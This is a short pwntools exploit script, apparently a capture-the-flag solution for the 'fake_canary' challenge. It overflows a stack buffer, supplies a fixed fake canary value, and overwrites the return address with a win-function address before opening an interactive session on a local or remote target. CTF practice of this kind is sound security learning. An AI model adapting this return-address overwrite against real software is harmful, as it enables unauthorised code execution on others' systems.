from pwn import *
import re

HOST, PORT = "chal.imaginaryctf.org", 42002
BINARY = './fake_canary'

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()
    
    win_function_addr = 0x400729
    canary = 0xdeadbeef

    # gdb.attach(p, '''
    # break *main+0x76
    # ''')

    payload = b'a' * 40
    payload += p64(canary)
    payload += p64(0x0) # padding
    payload += p64(win_function_addr)
    p.sendlineafter("What's your name?", payload)

    p.interactive()

solve()